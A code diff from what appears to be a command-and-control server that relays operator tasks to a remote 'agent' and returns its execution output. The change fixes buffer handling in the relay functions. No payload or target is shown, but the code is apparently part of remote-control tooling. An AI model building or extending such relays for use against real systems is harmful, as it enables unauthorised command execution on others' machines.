@@ -106,9 +106,12 @@ int main() {
                 //transfering (receiving/sending to agent)
                 executed = http_transfer(http_listener_accept, inside);
                 
+                char response[1024];
+                sprintf(response, "%s\n", executed); 
+                
                 //sending to client
-                send(inferno_accept, executed, sizeof(executed), 0);
-                printf("Sending to client: %s\n", executed);
+                send(inferno_accept, response, sizeof(response), 0);
+                printf("Sending to client: %s\n", response);
                 puts("===========END PAYLOAD===========\n");
             }
 
@@ -157,15 +160,16 @@ int http_listener(int http_listener_socket) {
 }
 
 char *http_transfer(int http_listener_accept, char *task) {
-     //sending task to client
+     //sending task to agent
      send(http_listener_accept, task, 1024, 0);
      printf("Sending to agent:\n\n%s\n", task);
 
-     //receiving client execution
-     char *executed;
-     recv(http_listener_accept, executed, sizeof(executed), 0);
+     //receiving egent execution
+     static char executed[1024];
+     recv(http_listener_accept, executed, 1024, 0);
      printf("Received from agent: %s\n", executed);
 
      //return client execution
      return executed;
 }
+
